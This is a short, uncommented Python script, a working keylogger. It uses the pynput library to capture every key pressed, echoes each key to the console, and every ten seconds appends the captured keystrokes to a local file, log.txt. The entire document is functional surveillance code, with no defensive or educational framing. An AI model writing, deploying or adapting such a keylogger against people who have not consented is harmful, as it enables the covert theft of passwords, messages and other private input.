from time import sleep
from pynput import keyboard
from datetime import datetime

keylog = []

def log():
    with open('log.txt', 'a') as log:
        log.write(''.join(keylog))

def on_press(key):
    try:
        print(str(key.char))
        keylog.append(str(key.char))
    except AttributeError:
        if(str(key)[4:] == 'space'):
            keylog.append(' ')
            print(' ')
        else:
            keylog.append(str(key)[4:])
            print(str(key)[4:])
        
listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    log()
    keylog = []
    print('keylog cleared')
    print('collecting for 10 seconds')
    sleep(10)


    
